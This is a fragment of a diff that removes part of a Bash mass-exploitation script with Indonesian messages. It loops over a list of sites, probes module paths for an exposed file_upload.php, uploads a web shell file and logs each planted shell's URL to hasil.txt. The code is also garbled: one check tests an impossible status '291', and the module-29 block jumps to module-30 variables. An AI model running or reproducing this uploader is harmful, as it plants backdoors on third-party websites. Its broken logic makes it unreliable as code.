-	echo "AKSESNYA => : ${url}/modules/${moduleslist[27]}/file_uploads/${fshell}" | tee -a hasil.txt
-	echo "+++++++++++++++++++++++++++++++++++++++++"
-fi 
-else
-	printf ${red}
-	echo "MODULE ${moduleslist[27]} TERGEMBOK"
-	fi
-	printf ${NC}
-	kamar28=$(curl -s -o /dev/null --connect-timeout 5 -w '%{http_code}' -A "${useragent}" "${url}/modules/${moduleslist[28]}/file_upload.php")
-	intip28=$(curl -s -X GET -A "${useragent}" "${url}/modules/${moduleslist[28]}/file_upload.php" 2>&1 | egrep -o "error") 
-	#sleep 1
-	if [ "404" == "${kamar28}" ] || [ "000" == "${kamar28}" ] || [ "403" == "${kamar28}" ] || [ "301" == "${kamar28}" ] || [ "500" == "${kamar28}" ] || [ "302" == "${kamar28}" ]; then
-		echo "JENDELA ${moduleslist[28]} TERTUTUP" 
-#false 
-elif
-	[ "291" == "${kamar28}" ] && [ "error" == "${intip28}" ]; then
-	echo "JENDELA ${moduleslist[28]} TERBUKA"
-	echo "USAHA NGITIPIN ${moduleslist[28]}"
-	# Save URL
-	liatxploit28=$(curl -s -X POST -w '%{http_code}' -A "${useragent}" -H "Content-Type: multipart/form-data" -F "userfile=@${fshell}" "${url}/modules/${moduleslist[28]}/file_upload.php" | egrep -o "success")
-if [ "success" == "${liatxploit28}" ]; then
-	printf ${cyan}
-	echo "+++++++++++++++++++++++++++++++++++++++++"
-	echo "!!! TERLIHAT SUDAH !!!"
-	echo "AKSESNYA => : ${url}/modules/${moduleslist[28]}/file_uploads/${fshell}" | tee -a hasil.txt
-	echo "+++++++++++++++++++++++++++++++++++++++++"
-fi 
-else
-	printf ${red}
-	echo "MODULE ${moduleslist[28]} TERGEMBOK"
-	fi
-	printf ${NC}
-	kamar29=$(curl -s -o /dev/null --connect-timeout 5 -w '%{http_code}' -A "${useragent}" "${url}/modules/${moduleslist[29]}/file_upload.php")
-	intip29=$(curl -s -X GET -A "${useragent}" "${url}/modules/${moduleslist[29]}/file_upload.php" 2>&1 | egrep -o "error") 
-	#sleep 1
-	if [ "404" == "${kamar29}" ] || [ "000" == "${kamar29}" ] || [ "403" == "${kamar29}" ] || [ "301" == "${kamar29}" ] || [ "500" == "${kamar29}" ] || [ "302" == "${kamar29}" ]; then
-		echo "JENDELA ${moduleslist[29]} TERTUTUP" 
-#false 
-elif
-	[ "200" == "${kamar30}" ] && [ "error" == "${intip30}" ]; then
-	echo "JENDELA ${moduleslist[30]} TERBUKA"
-	echo "USAHA NGITIPIN ${moduleslist[30]}"
-	# Save URL
-	liatxploit30=$(curl -s -X POST -w '%{http_code}' -A "${useragent}" -H "Content-Type: multipart/form-data" -F "userfile=@${fshell}" "${url}/modules/${moduleslist[30]}/file_upload.php" | egrep -o "success")
-if [ "success" == "${liatxploit30}" ]; then
-	printf ${cyan}
-	echo "+++++++++++++++++++++++++++++++++++++++++"
-	echo "!!! TERLIHAT SUDAH !!!"
-	echo "AKSESNYA => : ${url}/modules/${moduleslist[30]}/file_uploads/${fshell}" | tee -a hasil.txt
-	echo "+++++++++++++++++++++++++++++++++++++++++"
-fi 
-else
-	printf ${red}
-	echo "MODULE ${moduleslist[30]} TERGEMBOK"
 	fi 
 		printf ${NC}
 			done < "$slist"
